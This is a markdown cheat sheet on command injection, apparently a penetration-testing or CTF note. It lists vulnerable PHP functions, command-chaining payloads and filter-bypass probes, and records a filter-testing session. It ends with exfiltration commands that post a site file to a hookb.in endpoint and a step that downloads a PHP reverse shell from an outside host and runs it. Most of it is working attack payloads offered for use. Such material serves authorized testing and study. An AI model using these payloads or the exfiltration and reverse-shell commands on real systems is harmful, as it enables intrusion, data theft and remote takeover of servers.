# Command injection

## PHP vulnerable methods
1. exec()
2. passthru()
3. system()
4. eval()

If one of those method is in the code, the website may be vulnerable  
## Important shell commands
1. **Unix/Linux** :
	- whoami
	- ping
	- ls
	- sleep / asleep
	- nc
	- curl
2. **Windows** :
	- whoami
	- dir
	- ping
	- timeout
	- curl

# Payloads

```bash
# Line feed
ls %0A id # %0A Execute both (RECOMMENDED)

#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

## Blind command injection

Use sleep/timeout, redirections >, &, &&, curl, wget, ...
		
## Test filters

```
-                       syntax error
'                       syntax error
''                      OK
'127.0.0.1'             OK
()                      syntax error
`ls`                    syntax error (car ` filtré donc `ls` => ls)
`;`                     OK
127.|0.0.1              OK => | filtrated
127.0.&0.1              OK => & filtrated
127.0.;0.1              OK => ; filtrated
127.0.$0.1              OK => $ filtrated
127.0.`0.1              OK => ` filtrated
127.0.``0.1             OK => ` filtrated
127.0.'0.1              syntax error => ' not filtrated
127.0.''0.1             OK => '' empty string so no effect
192.198.169.198         NOK
127.0.0.1 127.0.0.1     NOK => as it does in a normal host, spaces accepted
127 .0.0.1              syntax error => confirm spaces OK
#127.0.0.1              syntax error
127.0.0.1 #127.0.0.1    OK => # not filtrated
127.0.0.1 -L            OK
127.0.0.1 -c 1          syntax error
127.0.0.1 -i 10         OK, long time (>20s) so argument injection valid
127.0.0.1%0asleep 20    long time (20s + ~3), so command asleep 20 probably executed
```
# Exfiltration

**Using post request**
```bash
wget --post-file index.php https://hookb.in/xxxxxx
curl --data "@index.php" https://hookb.in/xxxxxx
```

**Using an other server**
```bash
python -m SimpleHTTPServer 6666
python -m http.server 6666
```

**Reverse shell**
```bash
wget http://ssh.neoreo.fr/php-reverse-shell.php -O /tmp/reverse.php
php /tmp/reverse.php
```

# Tips

To simplify things, you can edit the DOM to convert `<input>` to `<textarea cols="22" rows="3">`

# Resources 
- https://github.com/payloadbox/command-injection-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/pentesting-web/command-injection
